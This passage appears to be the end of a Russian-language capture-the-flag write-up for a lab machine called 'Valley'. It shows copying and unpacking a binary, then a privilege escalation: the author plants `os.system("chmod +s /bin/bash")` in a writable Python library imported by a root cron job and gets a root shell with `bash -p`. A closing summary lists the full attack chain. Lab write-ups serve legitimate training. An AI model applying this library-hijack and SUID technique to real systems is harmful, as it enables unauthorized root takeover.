scp valleyDev@10.113.132.52:/home/valleyAuthenticator .
upx -d valleyAuthenticator

## Повышение привилегий через Python-библиотеку

После перехода к `valley` снова проверил cron-скрипт и его импорты. Скрипт запускался от root и импортировал системную библиотеку Python, к которой у моей группы был доступ на запись.

Добавил в библиотеку payload:

```python
import os
os.system("chmod +s /bin/bash")
```

![Редактирование импортируемой библиотеки](../images/Pasted%20image%2020260326023025.png)

После срабатывания cron `/bin/bash` получил SUID-бит root.

![Изменение прав /bin/bash](../images/Pasted%20image%2020260326023327.png)

Запустил привилегированный Bash:

```bash
/bin/bash -p
```

![Получение root через bash -p](../images/Pasted%20image%2020260326023339.png)

![Финальный результат](../images/Pasted%20image%2020260326023437.png)

## Итог

1. Нашёл учётные данные в сетевом трафике.
2. Подключился по SSH.
3. Обнаружил root-cron, запускающий Python-скрипт.
4. Исследовал `valleyAuthenticator` и восстановил пароль пользователя.
5. Использовал доступ на запись к импортируемой библиотеке Python.
6. Установил SUID на Bash и получил root через `bash -p`.
